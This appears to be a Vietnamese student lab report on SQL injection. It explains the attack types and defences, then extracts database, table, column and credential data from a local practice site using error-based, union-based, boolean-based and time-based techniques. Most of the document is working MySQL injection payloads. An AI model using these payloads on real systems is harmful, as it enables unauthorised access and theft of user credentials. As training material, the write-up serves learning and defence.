# Tìm hiểu SQL injection
## 1. SQL injection là gì?

SQL injection (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện đối với cơ sở dữ liệu. 
Với SQL injection, hacker có thể truy cập một phần hoặc toàn bộ dữ liệu trong hệ thống. Trong nhiều trường hợp, hacker không chỉ đọc được dữ liệu mà còn có thể chỉnh sửa dữ liệu. Lúc này hacker có thể đăng nhập dưới vai trò admin, lợi dụng hệ thống, hoặc xoá toàn bộ dữ liệu khiến hệ thống ngừng hoạt động.

## 2. Các dạng tấn công SQL injection

![](https://i.imgur.com/jIHZycb.png)

### 2.1. In-band SQLi

In-band SQL injection là kiểu tấn công SQL injection phổ biến và dễ khai thác nhất. In-band SQLi xảy ra khi kẻ tấn công sử dụng cùng một kênh liên lạc để khởi động các cuộc tấn công và thu thập kết quả. 
Hai loại phổ biến nhất của In-band SQLi là Error-based SQLi và Union-based SQLi.
* Error-based: kẻ tấn công thực hiện inject các câu truy vấn lỗi thông qua input, sau đó dựa vào những thông báo lỗi này để thu thập thông tin về cấu trúc DB.
* Union-based: kẻ tấn công lợi dụng toán tử UNION để thu thập thông tin về DB.

### 2.2. Inferential (Blind) SQLi

Thông tin về cơ sở dữ liệu không được hiển thị với người dùng nên kẻ tấn công phải gửi payload và thu thập thông tin thông qua các response.
Blind SQLi thường mất nhiều thời gian để khai thác hơn các dạng SQLi khác.
Có hai loại Blind SQLi là Time-based và Boolean-based.
* Time-based: Hacker sẽ gửi một truy vấn SQL, làm cho DB đợi (trong vài giây) trước khi có thể hoạt động. Sau đó, hacker có thể xem thời gian DB cần để phản hồi, một truy vấn là đúng hay sai. Dựa trên kết quả, một HTTP repsonse sẽ được tạo ra. Vì vậy hacker có thể tìm ra thông báo mà chúng đã sử dụng trả về đúng hay sai, không cần dựa vào dữ liệu từ DB.
* Boolean-based: Hacker gửi một truy vấn SQL đến DB, làm ứng dụng trả về một kết quả. Kết quả có thể khác nhau tùy vào truy vấn đúng hay sai. Dựa vào đó, kẻ tấn công điều chỉnh câu truy vấn để khai thác.

### 2.3. Out-of-band SQLi
 
Out-of-band SQL Injection không phổ biến lắm, chủ yếu là do nó phụ thuộc vào các tính năng được bật trên máy chủ cơ sở dữ liệu đang được ứng dụng web sử dụng.
Phương thức tấn công này sử dụng một cấu trúc truy vấn SQL để yêu cầu sever trả về kết quả thông qua các kênh liên quan đến mạng.

## 3. Cách phòng chống SQLi

* **Lọc dữ liệu từ người dùng:** Ta sử dụng filter để lọc các kí tự đặc biệt (; ” ‘) hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. 
* **Không cộng chuỗi để tạo SQL:** Sử dụng parameter thay vì cộng chuỗi. 
* **Không hiển thị exception, message lỗi:** Hacker dựa vào message lỗi để tìm ra cấu trúc database. Khi có lỗi, ta chỉ hiện thông báo lỗi chứ đừng hiển thị đầy đủ thông tin về lỗi, tránh hacker lợi dụng.
* **Phân quyền rõ ràng trong DB:** Nếu chỉ truy cập dữ liệu từ một số bảng, nên tạo một account trong DB và gán quyền truy cập cho account đó. Lúc này, dù hacker có inject được sql cũng không thể đọc dữ liệu từ các bảng chính, sửa hay xoá dữ liệu.
* **Backup dữ liệu thường xuyên:** Dữ liệu phải thường xuyên được backup để nếu có bị hacker xoá thì ta vẫn có thể khôi phục được. 

___

# Khai thác SQL injection

## 1. Khai thác Error-based 

Khi nhập `' OR 1=1 -- ` vào ô username, em nhận được thông báo đăng nhập thành công nên ở đây dính SQLi.

![](https://i.imgur.com/9G1I2t0.png)

Khi nhập vào đây một câu truy vấn lỗi syntax thì sẽ có thông báo lỗi hiện ra. Đây là dấu hiệu của error-based.

![](https://i.imgur.com/cJjElxV.png)

Để lấy được tên cơ sở dữ liệu, em tạo ra một payload dựa trên `Duplicate entry for key 'group_key'`. 

**Payload:**`' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- `

`floor(rand(0)*2)`: Sinh ra 0 hoặc 1 để nối với tên database phía trước. Điều này chắc chắn tạo ra một group_key bị trùng, chậm nhất là ở lần thứ ba.

![](https://i.imgur.com/dhSyED7.png)

Như vậy, em tìm được tên cơ sở dữ liệu là `kcsc`.
Lúc này, em tạo một payload tương tự để tìm tên bảng.

**Payload:** `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc'),'-',floor(rand(0)*2)) having min(0)-- `

![](https://i.imgur.com/kWFYSdV.png)

Ở đây, em thấy xuất hiện lỗi `Subquery returns more than 1 row in C:\xampp\htdocs\KCSC-train\task_1\login.php:28`. Điều này do cơ sở dữ liệu có nhiều hơn 1 bảng. Vậy để tìm ra tên bảng, em cần thêm `limit 0,1` vào payload để lấy ra tên bảng đầu tiên trong DB.

**Payload:** `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

![](https://i.imgur.com/G9WyOX4.png)

Ở đây, em biết được tên bảng đầu tiên là `task1`.
Tương tự, thay `limit 1,1`, em có tên bảng thứ hai là `upload`. 
Tăng lên `limit 2,1` em thấy không hiển thị lỗi nữa. Vậy DB này có 2 bảng là `task1` và `upload`. 
Tiếp theo, em khai thác thông tin ở bảng `task1`.
Bằng cách như trên, em cũng tìm ra được tên các cột trong bảng.

**Payload:** `' or 1=1 group by concat((select column_name from information_schema.columns where table_name='task1' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `.

![](https://i.imgur.com/h9UAKCh.png)

![](https://i.imgur.com/AxIr78R.png)

![](https://i.imgur.com/BUQ2qvP.png)

Vậy bảng `task1` có 3 cột lần lượt là: `id`, `username`, `password`.
Bây giờ, để lấy dữ liệu từ bảng, em truyền payload như sau:

**Payload lấy id:**`' or 1=1 group by concat((select id from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

**Payload lấy username:**`' or 1=1 group by concat((select username from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `

**Payload lấy password:**`' or 1=1 group by concat((select password from task1 limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
![](https://i.imgur.com/IFG4Swc.png)

![](https://i.imgur.com/U32xc1N.png)

![](https://i.imgur.com/68b7wch.png)

Em đã có được thông tin người dùng đầu tiên như sau:
> id: 22

> username: Cuc

> password: cuc

Muốn lấy thông tin những người dùng còn lại, ta làm tương tự như trên và thay bằng `limit 1,1`, `limit 2,1`,...

## 2. Khai thác Union-based

Tương tự như Error-based, em biết ô username dính SQLi.
Với Union-based, đầu tiên, em tìm số cột trong bảng bằng cách truyền payload `' OR 1=1 ORDER BY 1 -- ` vào ô `username`.

![](https://i.imgur.com/AzNOPNV.png)

Tăng lên bằng `ORDER BY 2`, `ORDER BY 3`, ta được kết quả tương tự như trên.
Với `ORDER BY 4`, em thấy thông báo lỗi `Unknown column '4' `.

![](https://i.imgur.com/vCTD4H1.png)

Vậy truy vấn trả về 3 cột.
Tiếp theo, em tìm cột hữu dụng với payload `' UNION SELECT 'a','b','c' -- ` thì thu được kết quả sau:

![](https://i.imgur.com/730i3Qp.png)

Vậy dữ liệu hiện ra được truy xuất từ cột thứ 2 trong bảng.

Với `' UNION SELECT 1,database(),3 --`, em tìm được tên cơ sở dữ liệu là `kcsc`.

![](https://i.imgur.com/K6uLx4i.png)

Với `' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='kcsc'-- `, em có tên bảng là `task1` và `upload`.

![](https://i.imgur.com/DwlC56P.png)

Tương tự, để tìm tên các cột, em truyền vào payload `' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='task1'-- `.

![](https://i.imgur.com/tfZhNq9.png)

Vậy bảng `task1` có 3 cột là `id`, `username` và `password`.

Bây giờ, để truy xuất dữ liệu người dùng, em sử dụng payload như sau:

`' UNION SELECT 1,GROUP_CONCAT(CONCAT(id,'~',username,'~',password)),3 FROM task1 -- `

![](https://i.imgur.com/e1GacrZ.png)

## 3. Khai thác Boolean based SQLi

Đầu tiên, em nhập `username` và `password` bất kỳ thì được kết quả như sau: 

![](https://i.imgur.com/tnBK5m8.png)

Thử nhập `a' or 1=1-- ` vào username thì được:

![](https://i.imgur.com/tdpLMDS.png)

Vậy ô `username` dính SQLi và dữ liệu truy xuất từ database không được hiển thị đối với người dùng.
Khi người dùng nhập input đúng thì sẽ thấy xuất hiện `Cuckooo...`, còn sai thì có thông báo `Tên đăng nhập hoặc mật khẩu sai.` 
Từ những thông tin như trên, ta có thể khai thác Boolean based SQLi trên web này.

### Tìm tên database 

* Tìm độ dài tên database

    **Payload:** `' OR length(database())= 1 -- ` 

    ![](https://i.imgur.com/8BUkiqn.png)

    => Payload trả về kết quả sai => độ dài tên DB không phải 1
    Payload trên không có lỗi nào nên em tiếp tục tăng giá trị lên bằng cách sử dụng Intruder.

    ![](https://i.imgur.com/2iItTUJ.png)

    ![](https://i.imgur.com/aWRdvh7.png)

    ![](https://i.imgur.com/UCHbb5q.png)
    
    Em thu được kết quả như sau:
    
    ![](https://i.imgur.com/U59YNPr.png)

    Vậy tên database chứa 4 ký tự.
    
* Tìm tên database

    **Payload:** `' OR SUBSTRING(database(), 1, 1) = 'a' -- ` 

    Send to Intruder:
    
    ![](https://i.imgur.com/hh4Sq8G.png)
    ___
    ![](https://i.imgur.com/FsDnMiJ.png)
    ___
    ![](https://i.imgur.com/AMjXuPV.png)
    ___
    ![](https://i.imgur.com/flJTc2N.png)
    ___
    Kết quả:
    
    ![](https://i.imgur.com/mjSkywZ.png)
    ___
    Vậy tên database là `kcsc`.
    
### Tìm tên bảng
* Tìm độ dài tên bảng

    Payload: `' or (select length(table_name) from information_schema.tables where table_schema='kcsc' limit 0,1)=1 -- `

    Send to Intruder:
    
    ![](https://i.imgur.com/HQK4nxx.png)
    ___
    ![](https://i.imgur.com/xOkSQAB.png)
    ___
    Kết quả:
    
    ![](https://i.imgur.com/FYYwqJG.png)
    ___
    Tên bảng chứa 5 ký tự.

* Tìm tên bảng

    Payload: `' or substring((select table_name from information_schema.tables where table_schema='kcsc' limit 0,1),1,1)='a' -- `

    Send to Intruder:

    ![](https://i.imgur.com/WqGw6cd.png)
    ___
    ![](https://i.imgur.com/9R7K7a9.png)
    ___
    ![](https://i.imgur.com/vtgDBcH.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/0RQOUvP.png)
    ___
    Tên bảng là `task7`.
    
### Tìm tên cột
* Tìm độ dài tên cột

    Payload: `' or (select length(column_name) from information_schema.columns where table_name='task7' limit 0,1)=1 -- `

    Send to Intruder: 

    ![](https://i.imgur.com/1CM2slO.png)
    ___
    ![](https://i.imgur.com/ADxiCPh.png)
    ___
    ![](https://i.imgur.com/Thg1isZ.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/fPVZKyJ.png)
    ___
    Bảng `task7` có 3 cột: độ dài của tên cột thứ nhất là 2, của hai cột còn lại là 8.

* Tìm tên các cột

    Payload: `'or substring((select column_name from information_schema.columns where table_name='task7' limit 0,1),1,1)='a' -- `

    Send to Intruder:

    ![](https://i.imgur.com/IQjxVRz.png)
    ___
    ![](https://i.imgur.com/4Al92BG.png)
    ___
    ![](https://i.imgur.com/LdGUD5u.png)
    ___
    ![](https://i.imgur.com/1PeY25K.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/ByiGsLx.png)

    Bảng `task7` có 3 cột lần lượt là: `id`, `username`, `password`.

### Lấy dữ liệu
#### Lấy username
* Tìm độ dài username 

    Payload: `' or (select length(username) from `task7` limit 0,1)=1 -- `

    Send to Intruder:

    ![](https://i.imgur.com/Q5WTCMb.png)
    ___
    ![](https://i.imgur.com/iiGqVfx.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/UJBtRQq.png)

Username đầu tiên có 8 ký tự.
* Tìm username

    Payload: `' or substring((select username from `task7`limit 0,1),1,1)='a' -- `

    Send to Intruder:

    ![](https://i.imgur.com/nIMJoJQ.png)
    ___
    ![](https://i.imgur.com/3B9LjFZ.png)
    ___
    ![](https://i.imgur.com/ZXr2ySU.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/7VDl6UR.png)

    Username đầu tiên là `duongcuc`.

#### Lấy password
Tương tự như lấy `username`, em tìm password với các payload sau:

* **Payload tìm độ dài password:** `' or (select length(password) from `task7` limit 0,1)=1 -- `

* **Payload tìm password:** `' or substring((select password from `task7` limit 0,1),1,1)='a' -- `

Kết quả:

![](https://i.imgur.com/vIzpByh.png)

Password đầu tiên là `cuc`.
Vậy user `duongcuc` có password là `cuc`.

## 4. Khai thác Time based SQLi
Lab này vẫn dính SQLi ở ô `username` nhưng khác lab trước là dù em nhập input đúng hay sai thì chỉ ra một kết quả như sau:

![](https://i.imgur.com/8ArUF9r.png)

Vì vậy, ta không thể khai thác Boolean như lab trước.

Em thử với payload `' or (case when 1=2 then 1 else sleep(1) end)=1 -- ` thì thấy response received lên đến hơn 3000 milis, vì vậy với lab này, ta có thể khai thác Time based SQLi.

![](https://i.imgur.com/lW7g816.png)


### Tìm tên database
* Tìm độ dài tên database

    **Payload:** `' or (case when length(database())=1 then sleep(1) else 1 end)=1 -- ` 

    Send to Intruder:
    
    ![](https://i.imgur.com/28yoEu6.png)
    ___
    ![](https://i.imgur.com/C9m7P2A.png)
    ___
    ![](https://i.imgur.com/bdwtpQI.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/bf8UGR4.png)

    Dựa vào response received => Tên database chứa 4 ký tự.
    
* Tìm tên database

    **Payload: **`' or (case when substring((database),1,1)='a' then sleep(1) else 1 end)=1 -- `

    Send to Intruder:

    ![](https://i.imgur.com/BnSL4Gg.png)
    ___
    ![](https://i.imgur.com/wwZYLYu.png)
    ___
    ![](https://i.imgur.com/Vw9ZRBr.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/HdIkvBs.png)

    Vậy tên database là `kcsc`.

### Tìm tên bảng
* Tìm độ dài tên bảng

    **Payload:** `' or (case when (select length(table_name) from information_schema.tables where table_schema='kcsc' limit 1,1)=1 then sleep(1) else 1 end)=1 -- ` 

    Send to Intruder:
    
    ![](https://i.imgur.com/ZAaDRPt.png)
    ___
    ![](https://i.imgur.com/tiE0yq4.png)
    ___
    ![](https://i.imgur.com/7SbSofv.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/LnaoaKo.png)

    Dựa vào response received => Tên bảng chứa 5 ký tự
    
* Tìm tên bảng

    **Payload:** `' or (case when substring((select table_name from information_schema.tables where table_schema='kcsc' limit 1,1),1,1)='a' then sleep(1) else 1 end)=1 -- ` 

    Send to Intruder:

    ![](https://i.imgur.com/NUFEzVE.png)
    ___
    ![](https://i.imgur.com/eE44AzL.png)
    ___
    ![](https://i.imgur.com/0rzV2OJ.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/Q7L6Ucb.png)

    Vậy tên bảng là `task7`.

### Tìm tên cột
* Tìm độ dài tên cột

    **Payload:** `' or (case when (select length(column_name) from information_schema.columns where table_name='task7' limit 0,1)=1 then sleep(1) else 1 end)=1 -- ` 

    Send to Intruder:
    
    ![](https://i.imgur.com/hB6mqrb.png)
    ___
    ![](https://i.imgur.com/7tX5iR3.png)
    ___
    ![](https://i.imgur.com/CRJvFL5.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/46mRRyq.png)

    Dựa vào response received => Bảng `task7` gồm 3 cột: tên cột thứ nhất chứa 2 ký tự, cột thứ hai và thứ ba đều chứa 8 ký tự.
    
* Tìm tên cột

    **Payload:** `' or (case when substring((select column_name from information_schema.columns where table_name='task7' limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- ` 

    Send to Intruder:

    ![](https://i.imgur.com/eIHGzqp.png)
    ___
    ![](https://i.imgur.com/z5JKiSg.png)
    ___
    ![](https://i.imgur.com/lNF2sgv.png)
    ___
    ![](https://i.imgur.com/lrFIbuj.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/YjTPEZI.png)

    Bảng `task7` có 3 cột lần lượt là `id`, `username` và `password`.
    
### Lấy dữ liệu
#### Lấy username
* Tìm độ dài username

    **Payload:** `' or (case when (select length(username) from `task7` limit 0,1)=1 then sleep(1) else 1 end)=1 -- ` 
    
    Send to Intruder:
    
    ![](https://i.imgur.com/lXUMQEv.png)
    ___
    ![](https://i.imgur.com/M1fcwHI.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/SOKvDui.png)

    Username đầu tiên chứa 8 ký tự.
    
* Tìm username

    **Payload:** `' or (case when substring((select username from `task7` limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- ` 

    Send to Intruder:

    ![](https://i.imgur.com/nuGRpHV.png)
    ___
    ![](https://i.imgur.com/kKa92i5.png)
    ___
    ![](https://i.imgur.com/30tja8E.png)
    ___
    Kết quả:

    ![](https://i.imgur.com/fI6USm4.png)

    Username đầu tiên là `duongcuc`.
    
#### Lấy password
Tương tự như lấy `username`, em tìm password với các payload sau:

* **Payload tìm độ dài password:** `' or (case when (select length(password) from `task7` limit 0,1)=1 then sleep(1) else 1 end)=1 -- `

* **Payload tìm password:** `' or (case when substring((select password from `task7` limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- `

Kết quả:

![](https://i.imgur.com/FMU4OBk.png)

Password đầu tiên là `cuc`.
Vậy user `duongcuc` có password là `cuc`.